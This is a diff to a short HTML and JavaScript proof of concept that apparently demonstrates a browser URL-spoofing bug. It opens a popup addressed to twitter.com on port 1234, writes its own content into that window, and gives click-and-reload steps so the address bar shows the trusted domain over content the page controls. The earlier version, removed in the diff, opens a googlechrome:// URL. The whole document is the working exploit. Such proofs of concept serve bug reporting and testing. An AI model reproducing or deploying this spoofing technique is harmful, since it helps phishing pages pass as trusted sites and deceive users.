@@ -1,12 +1,14 @@
-<html>
+
 	<script>
-	    pwn = () => {
-		var x = window.open('googlechrome://google.com:1234');
-		    setTimeout(function(){x.alert()}, 3000)
-	        
+	    function pwn() {
+	        v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+	        i = setInterval(`
+	            x.document.write("<h1>url spoofing...</h1>");
+	            clearInterval(v);
+	            clearInterval(i);
+	            `, 3333);
 	    }
 	</script>
-	<h1>
-	    <a onclick="pwn()">ClickMe :-)</a>
-	</h1>
-	</html>
+	<li onclick="pwn()">step1: click me</li>
+	<li>step2: try use keyboard `command + r`</li>
+	<li>step3: xD</li>
